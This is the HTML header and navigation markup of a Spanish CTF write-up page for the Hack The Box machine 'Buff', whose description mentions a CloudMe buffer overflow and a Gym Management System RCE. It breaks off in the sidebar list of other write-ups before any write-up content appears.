<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href=/main.35c3ea08d4f2b16f64786716901e94ba1cde7a2003f17dea3c85090acdc8386aa9eea4af71348866c47f13039a34a042c86da4c8221e5062bc52819843cacbea.css integrity="sha512-NcPqCNTysW9keGcWkB6UuhzeeiAD8X3qPIUJCs3IOGqp7qSvcTSIZsR/EwOaNKBCyG2kyCIeUGK8UoGYQ8rL6g==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/writeups/hackthebox/buff/><title>Buff | d3bo</title><meta name=description content><meta property="og:title" content="Buff"><meta property="og:description" content="Es una máquina muy simple, pero vamos a analizar en profundidad un Buffer Overflow de CloudMe 1.11.2 y un &lsquo;Unauthenticated Remote Code Execution&rsquo; en  &lsquo;Gym Management System 1.0&rsquo;"><meta property="og:type" content="article"><meta property="og:url" content="/writeups/hackthebox/buff/"><meta property="og:image" content="/writeups/hackthebox/buff/cover.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2024-03-18T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-18T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/writeups/hackthebox/buff/cover.png"><meta name=twitter:title content="Buff"><meta name=twitter:description content="Es una máquina muy simple, pero vamos a analizar en profundidad un Buffer Overflow de CloudMe 1.11.2 y un &lsquo;Unauthenticated Remote Code Execution&rsquo; en  &lsquo;Gym Management System 1.0&rsquo;"><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3bo","position":1},{"@type":"ListItem","item":"/writeups/","name":"Writeups","position":2},{"@type":"ListItem","item":"/writeups/hackthebox/","name":"Hack the Box","position":3},{"@type":"ListItem","name":"Buff","position":4}]}</script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"></head><body class="single section writeups" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div id=announcement data-id=global-alert-ed321576fabf52d76f925272710cb364 class="alert alert-primary alert-dismissible fade show text-center" role=alert><span class=alert-text>¡Nuevo writeup de la máquina "<a href=/writeups/hackthebox/schooled>Schooled</a>" de HackTheBox!</span>
<button type=button class=btn-close data-bs-dismiss=alert aria-label=Close></button></div><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3bo</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Writeups</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/intro/bienvenido/><img src=/writeups/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=true>
HackTheBox</button><div class="collapse show" id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/><img src=/writeups/hackthebox/jupiter//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Jupiter</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/enterprise/><img src=/writeups/hackthebox/enterprise//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Enterprise</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/october/><img src=/writeups/hackthebox/october//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>October</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/schooled/><img src=/writeups/hackthebox/schooled//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Schooled</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/blue/><img src=/writeups/hackthebox/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/><img src=/writeups/hackthebox/bashed-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bashed (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/><img src=/writeups/hackthebox/horizontall-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Horizontall (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/><img src=/writeups/hackthebox/pandora-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pandora (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/><img src=/writeups/hackthebox/toolbox//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Toolbox</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/writeups/hackthebox/buff/><img src=/writeups/hackthebox/buff//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Buff</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/tabby/><img src=/writeups/hackthebox/tabby//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tabby</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/><img src=/writeups/tryhackme/pickle-rick//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pickle Rick</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/rootme/><img src=/writeups/tryhackme/rootme//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>RootMe</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/><img src=/writeups/tryhackme/chocolate-factory//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chocolate Factory</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/><img src=/writeups/tryhackme/lazy-admin//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Lazy admin</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/><img src=/writeups/tryhackme/agent-sudo//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent sudo</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/><img src=/writeups/tryhackme/brooklyn-nine-nine//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Brooklyn Nine Nine</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/><img src=/writeups/tryhackme/vulnversity//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Vulnversity</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/><img src=/writeups/tryhackme/agent-t//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent T</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/><img src=/writeups/tryhackme/mr.robot//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mr.Robot</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/gallery/><img src=/writeups/tryhackme/gallery//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Gallery</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wgel/><img src=/writeups/tryhackme/wgel//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wgel</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/><img src=/writeups/tryhackme/tomghost//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tomghost</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/develpy/><img src=/writeups/tryhackme/develpy//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Develpy</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/overpass/><img src=/writeups/tryhackme/overpass//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Overpass</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/><img src=/writeups/tryhackme/bounty-hacker//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bounty Hacker</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/><img src=/writeups/tryhackme/wonderland//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wonderland</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/><img src=/writeups/tryhackme/mustacchio//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mustacchio</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/source/><img src=/writeups/tryhackme/source//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Source</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/startup/><img src=/writeups/tryhackme/startup//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Startup</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/team/><img src=/writeups/tryhackme/team//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Team</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/><img src=/writeups/tryhackme/chill-hack//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chill Hack</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/blue/><img src=/writeups/tryhackme/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/liceo/>Liceo</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ccdabd144af006c40e0937d3f87d7afa aria-expanded=false>
VulnHub</button><div class=collapse id=section-ccdabd144af006c40e0937d3f87d7afa><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/vulnhub/brainpan-1/>Brainpan 1</a></li></ul></div></li></ul></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>d3bo</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li><li class=nav-item><a class="nav-link active" href=/writeups/intro/bienvenido/ aria-current=true>Writeups</a></li><li class=nav-item><a class=nav-link href=/about/>About</a></li><li class=nav-item><a class=nav-link href=/ctf/intro/bienvenido/>CTF</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://x.com/sr_d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://github.com/d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=utf-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class="content d-none">Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/intro/bienvenido/><img src=/writeups/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=true>
HackTheBox</button><div class="collapse show" id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/><img src=/writeups/hackthebox/jupiter//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Jupiter</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/enterprise/><img src=/writeups/hackthebox/enterprise//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Enterprise</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/october/><img src=/writeups/hackthebox/october//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>October</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/schooled/><img src=/writeups/hackthebox/schooled//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Schooled</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/blue/><img src=/writeups/hackthebox/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/><img src=/writeups/hackthebox/bashed-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bashed (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/><img src=/writeups/hackthebox/horizontall-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Horizontall (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/><img src=/writeups/hackthebox/pandora-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pandora (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/><img src=/writeups/hackthebox/toolbox//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Toolbox</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/writeups/hackthebox/buff/><img src=/writeups/hackthebox/buff//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Buff</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/tabby/><img src=/writeups/hackthebox/tabby//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tabby</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/><img src=/writeups/tryhackme/pickle-rick//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pickle Rick</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/rootme/><img src=/writeups/tryhackme/rootme//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>RootMe</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/><img src=/writeups/tryhackme/chocolate-factory//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chocolate Factory</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/><img src=/writeups/tryhackme/lazy-admin//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Lazy admin</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/><img src=/writeups/tryhackme/agent-sudo//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent sudo</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/><img src=/writeups/tryhackme/brooklyn-nine-nine//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Brooklyn Nine Nine</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/><img src=/writeups/tryhackme/vulnversity//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Vulnversity</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/><img src=/writeups/tryhackme/agent-t//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent T</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/><img src=/writeups/tryhackme/mr.robot//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mr.Robot</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/gallery/><img src=/writeups/tryhackme/gallery//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Gallery</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wgel/><img src=/writeups/tryhackme/wgel//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wgel</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/><img src=/writeups/tryhackme/tomghost//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tomghost</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/develpy/><img src=/writeups/tryhackme/develpy//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Develpy</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/overpass/><img src=/writeups/tryhackme/overpass//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Overpass</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/><img src=/writeups/tryhackme/bounty-hacker//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bounty Hacker</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/><img src=/writeups/tryhackme/wonderland//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wonderland</a></li><li 